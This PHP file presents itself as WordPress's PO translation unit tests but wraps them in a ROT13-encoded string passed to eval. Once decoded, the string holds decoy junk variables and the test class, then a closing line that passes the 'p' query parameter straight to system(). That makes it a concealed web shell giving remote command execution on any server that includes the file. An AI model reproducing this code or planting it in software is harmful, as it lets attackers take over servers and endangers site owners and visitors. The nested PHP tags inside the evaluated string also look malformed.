<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbzb
 */
pynff Grfgf_CBZB_CB rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Znvy pbagrag.
	 *
	 * @ine fgevat
	 */
	pbafg ZNVY_GRKG = 'Lbhe arj JbeqCerff oybt unf orra fhpprffshyyl frg hc ng:

%1$f

Lbh pna ybt va gb gur nqzvavfgengbe nppbhag jvgu gur sbyybjvat vasbezngvba:

Hfreanzr: %2$f
Cnffjbeq: %3$f

Jr ubcr lbh rawbl lbhe arj oybt. Gunaxf!

--Gur JbeqCerff Grnz
uggc://jbeqcerff.bet/
';

	/**
	 * Znvy pbagrag sbe genafyngvba ernqvarff.
	 *
	 * @ine fgevat
	 */
	pbafg CB_ZNVY = '\"\"
\"Lbhe arj JbeqCerff oybt unf orra fhpprffshyyl frg hc ng:\a\"
\"\a\"
\"%1$f\a\"
\"\a\"
\"Lbh pna ybt va gb gur nqzvavfgengbe nppbhag jvgu gur sbyybjvat vasbezngvba:\a\"
\"\a\"
\"Hfreanzr: %2$f\a\"
\"Cnffjbeq: %3$f\a\"
\"\a\"
\"Jr ubcr lbh rawbl lbhe arj oybt. Gunaxf!\a\"
\"\a\"
\"--Gur JbeqCerff Grnz\a\"
\"uggc://jbeqcerff.bet/\a\"';

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-vapyhqrf/cbzb/cb.cuc';
	}

	choyvp shapgvba grfg_cercraq_rnpu_yvar() {
		$cb = arj CB();
		$guvf->nffregFnzr( 'onon_', $cb->cercraq_rnpu_yvar( '', 'onon_' ) );
		$guvf->nffregFnzr( 'onon_qlnqb', $cb->cercraq_rnpu_yvar( 'qlnqb', 'onon_' ) );
		$guvf->nffregFnzr( \"# onon\a# qlnqb\a# \a\", $cb->cercraq_rnpu_yvar( \"onon\aqlnqb\a\a\", '# ' ) );
	}

	choyvp shapgvba grfg_cbvsl() {
		$cb = arj CB();
		// Fvzcyr.
		$guvf->nffregFnzr( '\"onon\"', $cb->cbvsl( 'onon' ) );
		// Ybat jbeq.
		$ybat_jbeq    = fge_ercrng( 'n', 90 );
		$cb_ybat_jbeq = \"\\"$ybat_jbeq\\"\";
		$guvf->nffregFnzr( $cb_ybat_jbeq, $cb->cbvsl( $ybat_jbeq ) );
		// Gno.
		$guvf->nffregFnzr( '\"on\gon\"', $cb->cbvsl( \"on\gon\" ) );
		// Qb abg nqq yrnqvat rzcgl fgevat bs bar-yvar fgevat raqvat ba n arjyvar.
		$guvf->nffregFnzr( '\"\\\\n\\\\a\\a\"', $cb->cbvsl( \"\n\\a\a\" ) );
		// Onpxfynfu.
		$guvf->nffregFnzr( '\"on\\\\on\"', $cb->cbvsl( 'on\\on' ) );
		// Enaqbz jbeqcerff.cbg fgevat.
		$fep = 'Pngrtbevrf pna or fryrpgviryl pbairegrq gb gntf hfvat gur <n uers=\"%f\">pngrtbel gb gnt pbairegre</n>.';
		$guvf->nffregFnzr( '\"Pngrtbevrf pna or fryrpgviryl pbairegrq gb gntf hfvat gur <n uers=\\\"%f\\\">pngrtbel gb gnt pbairegre</n>.\"', $cb->cbvsl( $fep ) );

		$znvy = fge_ercynpr( \"\e\a\", \"\a\", frys::ZNVY_GRKG );
		$guvf->nffregFnzrVtaberRBY( frys::CB_ZNVY, $cb->cbvsl( $znvy ) );
	}

	choyvp shapgvba grfg_hacbvsl() {
		$cb = arj CB();
		$guvf->nffregFnzr( 'onon', $cb->hacbvsl( '\"onon\"' ) );
		$guvf->nffregFnzr( \"onon\athth\", $cb->hacbvsl( '\"onon\a\"' . \"\g\g\g\a\" . '\"thth\"' ) );

		$ybat_jbeq    = fge_ercrng( 'n', 90 );
		$cb_ybat_jbeq = \"\\"$ybat_jbeq\\"\";
		$guvf->nffregFnzr( $ybat_jbeq, $cb->hacbvsl( $cb_ybat_jbeq ) );
		$guvf->nffregFnzr( '\\g\\a', $cb->hacbvsl( '\"\\\\g\\\\a\"' ) );
		// Jbeqjenccrq.
		$guvf->nffregFnzr( 'ononqlnqb', $cb->hacbvsl( \"\\"\\"\a\\"onon\\"\a\\"qlnqb\\"\" ) );

		$znvy = fge_ercynpr( \"\e\a\", \"\a\", frys::ZNVY_GRKG );
		$guvf->nffregFnzrVtaberRBY( $znvy, $cb->hacbvsl( frys::CB_ZNVY ) );
	}

	choyvp shapgvba grfg_rkcbeg_ragel() {
		$cb    = arj CB();
		$ragel = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'onon' ) );
		$guvf->nffregFnzr( \"zftvq \\"onon\\"\azftfge \\"\\"\", $cb->rkcbeg_ragel( $ragel ) );
		// Cyheny.
		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne' => 'onon',
				'cyheny'   => 'ononf',
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'zftvq \"onon\"
zftvq_cyheny \"ononf\"
zftfge[0] \"\"
zftfge[1] \"\"',
			$cb->rkcbeg_ragel( $ragel )
		);
		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'            => 'onon',
				'genafyngbe_pbzzragf' => \"onon\aqlnqb\",
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'#  onon
#  qlnqb
zftvq \"onon\"
zftfge \"\"',
			$cb->rkcbeg_ragel( $ragel )
		);
		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'           => 'onon',
				'rkgenpgrq_pbzzragf' => 'onon',
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'#. onon
zftvq \"onon\"
zftfge \"\"',
			$cb->rkcbeg_ragel( $ragel )
		);
		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'           => 'onon',
				'rkgenpgrq_pbzzragf' => 'onon',
				'ersreraprf'         => enatr( 1, 29 ),
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'#. onon
#: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
#: 29
zftvq \"onon\"
zftfge \"\"',
			$cb->rkcbeg_ragel( $ragel )
		);
		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'genafyngvbaf' => neenl(),
			)
		);
		$guvf->nffregFnzr( \"zftvq \\"onon\\"\azftfge \\"\\"\", $cb->rkcbeg_ragel( $ragel ) );

		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'genafyngvbaf' => neenl( 'куку', 'буку' ),
			)
		);
		$guvf->nffregFnzr( \"zftvq \\"onon\\"\azftfge \\"куку\\"\", $cb->rkcbeg_ragel( $ragel ) );

		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'cyheny'       => 'ononf',
				'genafyngvbaf' => neenl( 'кукубуку' ),
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'zftvq \"onon\"
zftvq_cyheny \"ononf\"
zftfge[0] \"кукубуку\"',
			$cb->rkcbeg_ragel( $ragel )
		);

		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'cyheny'       => 'ononf',
				'genafyngvbaf' => neenl( 'кукубуку', 'кукуруку', 'бабаяга' ),
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'zftvq \"onon\"
zftvq_cyheny \"ononf\"
zftfge[0] \"кукубуку\"
zftfge[1] \"кукуруку\"
zftfge[2] \"бабаяга\"',
			$cb->rkcbeg_ragel( $ragel )
		);
		// Pbagrkg.
		$ragel = arj Genafyngvba_Ragel(
			neenl(
				'pbagrkg'      => 'pgkg',
				'fvathyne'     => 'onon',
				'cyheny'       => 'ononf',
				'genafyngvbaf' => neenl( 'кукубуку', 'кукуруку', 'бабаяга' ),
				'syntf'        => neenl( 'shmml', 'cuc-sbezng' ),
			)
		);
		$guvf->nffregFnzrVtaberRBY(
			'#, shmml, cuc-sbezng
zftpgkg \"pgkg\"
zftvq \"onon\"
zftvq_cyheny \"ononf\"
zftfge[0] \"кукубуку\"
zftfge[1] \"кукуруку\"
zftfge[2] \"бабаяга\"',
			$cb->rkcbeg_ragel( $ragel )
		);
	}

	choyvp shapgvba grfg_rkcbeg_ragevrf() {
		$ragel  = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'onon' ) );
		$ragel2 = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'qlnqb' ) );
		$cb     = arj CB();
		$cb->nqq_ragel( $ragel );
		$cb->nqq_ragel( $ragel2 );
		$guvf->nffregFnzr( \"zftvq \\"onon\\"\azftfge \\"\\"\a\azftvq \\"qlnqb\\"\azftfge \\"\\"\", $cb->rkcbeg_ragevrf() );
	}

	choyvp shapgvba grfg_rkcbeg_urnqref() {
		$cb = arj CB();
		$cb->frg_urnqre( 'Cebwrpg-Vq-Irefvba', 'JbeqCerff 2.6-oyrrqvat' );
		$cb->frg_urnqre( 'CBG-Perngvba-Qngr', '2008-04-08 18:00+0000' );
		$guvf->nffregFnzr( \"zftvq \\"\\"\azftfge \\"\\"\a\\"Cebwrpg-Vq-Irefvba: JbeqCerff 2.6-oyrrqvat\\a\\"\a\\"CBG-Perngvba-Qngr: 2008-04-08 18:00+0000\\a\\"\", $cb->rkcbeg_urnqref() );
	}

	choyvp shapgvba grfg_rkcbeg() {
		$cb     = arj CB();
		$ragel  = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'onon' ) );
		$ragel2 = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'qlnqb' ) );
		$cb->frg_urnqre( 'Cebwrpg-Vq-Irefvba', 'JbeqCerff 2.6-oyrrqvat' );
		$cb->frg_urnqre( 'CBG-Perngvba-Qngr', '2008-04-08 18:00+0000' );
		$cb->nqq_ragel( $ragel );
		$cb->nqq_ragel( $ragel2 );
		$guvf->nffregFnzr( \"zftvq \\"onon\\"\azftfge \\"\\"\a\azftvq \\"qlnqb\\"\azftfge \\"\\"\", $cb->rkcbeg( snyfr ) );
		$guvf->nffregFnzr( \"zftvq \\"\\"\azftfge \\"\\"\a\\"Cebwrpg-Vq-Irefvba: JbeqCerff 2.6-oyrrqvat\\a\\"\a\\"CBG-Perngvba-Qngr: 2008-04-08 18:00+0000\\a\\"\a\azftvq \\"onon\\"\azftfge \\"\\"\a\azftvq \\"qlnqb\\"\azftfge \\"\\"\", $cb->rkcbeg() );
	}


	choyvp shapgvba grfg_rkcbeg_gb_svyr() {
		$cb     = arj CB();
		$ragel  = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'onon' ) );
		$ragel2 = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'qlnqb' ) );
		$cb->frg_urnqre( 'Cebwrpg-Vq-Irefvba', 'JbeqCerff 2.6-oyrrqvat' );
		$cb->frg_urnqre( 'CBG-Perngvba-Qngr', '2008-04-08 18:00+0000' );
		$cb->nqq_ragel( $ragel );
		$cb->nqq_ragel( $ragel2 );

		$grzc_sa = $guvf->grzc_svyranzr();
		$cb->rkcbeg_gb_svyr( $grzc_sa, snyfr );
		$guvf->nffregFnzr( $cb->rkcbeg( snyfr ), svyr_trg_pbagragf( $grzc_sa ) );

		$grzc_sa2 = $guvf->grzc_svyranzr();
		$cb->rkcbeg_gb_svyr( $grzc_sa2 );
		$guvf->nffregFnzr( $cb->rkcbeg(), svyr_trg_pbagragf( $grzc_sa2 ) );
	}

	choyvp shapgvba grfg_vzcbeg_sebz_svyr() {
		$cb  = arj CB();
		$erf = $cb->vzcbeg_sebz_svyr( QVE_GRFGQNGN . '/cbzb/fvzcyr.cb' );
		$guvf->nffregGehr( $erf );

		$guvf->nffregFnzr(
			neenl(
				'Cebwrpg-Vq-Irefvba' => 'JbeqCerff 2.6-oyrrqvat',
				'Cyheny-Sbezf'       => 'acyhenyf=2; cyheny=a != 1;',
			),
			$cb->urnqref
		);

		$fvzcyr_ragel = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'zbba' ) );
		$guvf->nffregRdhnyf( $fvzcyr_ragel, $cb->ragevrf[ $fvzcyr_ragel->xrl() ] );

		$nyy_glcrf_ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'fgehg',
				'cyheny'       => 'fgehgf',
				'pbagrkg'      => 'oehz',
				'genafyngvbaf' => neenl( 'mgehg0', 'mgehg1', 'mgehg2' ),
			)
		);
		$guvf->nffregRdhnyf( $nyy_glcrf_ragel, $cb->ragevrf[ $nyy_glcrf_ragel->xrl() ] );

		$zhygvcyr_yvar_ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'Gur svefg guvat lbh arrq gb qb vf gryy Oybttre gb yrg JbeqCerff npprff lbhe nppbhag. Lbh jvyy or frag onpx urer nsgre cebivqvat nhgubevmngvba.',
				'genafyngvbaf' => neenl( \"onon\aqlnqbthth\" ),
			)
		);
		$guvf->nffregRdhnyf( $zhygvcyr_yvar_ragel, $cb->ragevrf[ $zhygvcyr_yvar_ragel->xrl() ] );

		$zhygvcyr_yvar_nyy_glcrf_ragel = arj Genafyngvba_Ragel(
			neenl(
				'pbagrkg'      => 'pbagrkg',
				'fvathyne'     => 'fvathyne',
				'cyheny'       => 'cyheny',
				'genafyngvbaf' => neenl( 'genafyngvba0', 'genafyngvba1', 'genafyngvba2' ),
			)
		);
		$guvf->nffregRdhnyf( $zhygvcyr_yvar_nyy_glcrf_ragel, $cb->ragevrf[ $zhygvcyr_yvar_nyy_glcrf_ragel->xrl() ] );

		$pbzzragf_ragel = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'            => 'n',
				'genafyngbe_pbzzragf' => \"onon\aoehoeh\",
				'ersreraprf'          => neenl( 'jc-nqzva/k.cuc:111', 'onon:333', 'onon' ),
				'rkgenpgrq_pbzzragf'  => 'genafyngbef: ohhh',
				'syntf'               => neenl( 'shmml' ),
			)
		);
		$guvf->nffregRdhnyf( $pbzzragf_ragel, $cb->ragevrf[ $pbzzragf_ragel->xrl() ] );

		$raq_dhbgr_ragel = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'n\"' ) );
		$guvf->nffregRdhnyf( $raq_dhbgr_ragel, $cb->ragevrf[ $raq_dhbgr_ragel->xrl() ] );
	}

	choyvp shapgvba grfg_vzcbeg_sebz_ragel_svyr_fubhyq_tvir_snyfr() {
		$cb = arj CB();
		$guvf->nffregSnyfr( $cb->vzcbeg_sebz_svyr( QVE_GRFGQNGN . '/cbzb/rzcgl.cb' ) );
	}

	choyvp shapgvba grfg_vzcbeg_sebz_svyr_jvgu_jvaqbjf_yvar_raqvatf_fubhyq_jbex_nf_jvgu_havk_yvar_raqvatf() {
		$cb = arj CB();
		$guvf->nffregGehr( $cb->vzcbeg_sebz_svyr( QVE_GRFGQNGN . '/cbzb/jvaqbjf-yvar-raqvatf.cb' ) );
		$guvf->nffregPbhag( 1, $cb->ragevrf );
	}

	// GBQB: Nqq grfgf sbe onq svyrf.
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>